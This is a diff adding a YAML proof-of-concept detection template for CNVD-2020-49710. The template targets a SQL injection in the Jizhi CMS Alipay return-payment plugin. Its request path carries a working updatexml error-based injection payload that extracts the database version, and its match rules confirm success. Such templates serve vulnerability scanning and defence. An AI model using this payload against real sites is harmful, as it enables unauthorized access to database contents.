@@ -1,0 +1,17 @@
+id: CNVD-2020-49710
+
+info:
+  name: 极致CMS alipay_return_pay SQL注入漏洞CNVD-2020-49710
+  author: daffainfo
+  severity: critical
+  description: 极致CMS支付插件中存在SQL注入漏洞，通过漏洞可以获取数据库信息 icon_hash="1657387632"
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/%E6%9E%81%E8%87%B4CMS%20alipay_return_pay%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+"
+    expression: r"~(.*?)~".bmatches(response.body) && response.body.bcontains(b'XPATH syntax error:') && response.body.bcontains(b'jz_orders')
+expression: r0()
